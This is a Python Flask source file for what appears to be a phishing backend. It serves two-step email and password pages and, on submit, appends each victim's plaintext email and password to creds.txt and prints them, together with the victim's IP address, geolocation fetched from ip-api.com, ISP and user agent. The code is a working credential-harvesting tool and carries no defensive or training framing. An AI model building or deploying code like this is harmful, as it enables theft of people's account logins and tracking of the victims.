from flask import Flask, render_template, request
import datetime
import requests

def get_location(ip):
    url = f"http://ip-api.com/json/{ip}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        return {
            "city": data.get("city"),
            "region": data.get("regionName"),
            "country": data.get("country"),
            "timezone": data.get("timezone"),
            "isp": data.get("isp")
        }


app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/password')
def password():
    email = request.args.get('email')
    return render_template('password.html', email=email)


@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email')
    password = request.form.get('password')
    # Get IP address from request context
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    # Get location from IP
    location = get_location(ip)
    location_str = (
        f"{location['city']}, {location['region']}, {location['country']} | {location['isp']} | {location['timezone']}"
        if location else "Location Unknown"
    )
    user_agent = request.headers.get('User-Agent')
    # Save to file
    with open("creds.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} | {email} | {password} | IP: {ip} | Location: {location_str} | UA: {user_agent}\n")
    print(f"[LOG] {datetime.datetime.now()} | {email} | {password} | IP: {ip} | Location: {location_str} | UA: {user_agent}\n")
    return render_template('submit.html', email=email)

if __name__ == '__main__':
    app.run(debug=True)
